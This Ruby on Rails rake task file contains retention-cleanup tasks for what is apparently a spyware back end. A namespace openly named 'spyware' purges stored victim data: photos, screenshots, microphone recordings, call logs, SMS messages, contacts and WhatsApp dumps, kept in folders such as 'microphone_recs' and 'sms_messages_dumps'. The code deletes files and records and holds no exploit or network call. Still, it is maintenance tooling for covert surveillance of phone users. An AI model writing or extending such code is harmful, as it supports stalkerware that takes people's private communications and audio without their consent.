namespace :cleanup do
  desc 'Remove old dump and payload files'
  task files: :environment do
    retention_days = (ENV['FILE_RETENTION_DAYS'].presence || 14).to_i
    cutoff = Time.current - retention_days.days
    base_paths = [
      Rails.root.join('files', 'dumps'),
      Rails.root.join('files', 'payloads')
    ]

    base_paths.each do |path|
      next unless Dir.exist?(path)

      Dir.glob(File.join(path, '**', '*')).each do |file|
        next unless File.file?(file)
        mtime = File.mtime(file)
        if mtime < cutoff
          File.delete(file)
          puts "Deleted stale file: #{file}"
        end
      rescue StandardError => e
        puts "Failed to delete #{file}: #{e.message}"
      end
    end
  end
end
namespace :spyware do
  desc "Remove data older than X days"
  task clean_old_data: :environment do
    raw_days = ENV['DATA_RETENTION_DAYS']
    days = (raw_days.presence || 30).to_i
    limit = days.days.ago.to_date
    
    puts "[Cleanup] Removing data older than #{days} days (before #{limit})..."

    # Helper to clean generic file-based models
    def clean_model(model_class, folder_name, date_column = :date)
      puts "Processing #{model_class.name}..."
      model_class.where("#{date_column} < ?", @limit).find_each do |rec|
        filename = rec.try(:filename)
        next unless filename.present?

        path = Rails.root.join('files', 'dumps', folder_name, filename)
        
        if File.exist?(path)
          begin
            File.delete(path)
            puts "  Deleted file: #{filename}"
          rescue => e
            puts "  Error deleting #{path}: #{e.message}"
          end
        else
          puts "  File not found: #{filename} (cleaning DB record anyway)"
        end

        rec.destroy
      end
    end

    # Make limit available to helper (instance var in task block scope)
    @limit = limit

    # Map models to their folder names in files/dumps/
    clean_model(Picture, 'pictures')
    clean_model(Screenshot, 'screen_snaps')
    clean_model(Recording, 'microphone_recs')
    clean_model(CallLog, 'calllogs_dumps')
    clean_model(SmsMessage, 'sms_messages_dumps')
    clean_model(Contact, 'contacts_dumps')
    
    # MessagingAppsDump might be tricky if it supports multiple apps
    puts "Processing MessagingAppsDump..."
    MessagingAppsDump.where('date < ?', limit).find_each do |rec|
      folder = rec.app_name.downcase rescue 'whatsapp'
      # whitelist known folders to prevent path traversal issues or errors
      folder = 'whatsapp' unless ['whatsapp'].include?(folder)
      
      filename = rec.filename
      if filename.present?
        path = Rails.root.join('files', 'dumps', folder, filename)
        if File.exist?(path)
          File.delete(path) 
          puts "  Deleted #{path}"
        end
      end
      rec.destroy
    end

    puts "[Cleanup] Done."
  end
end
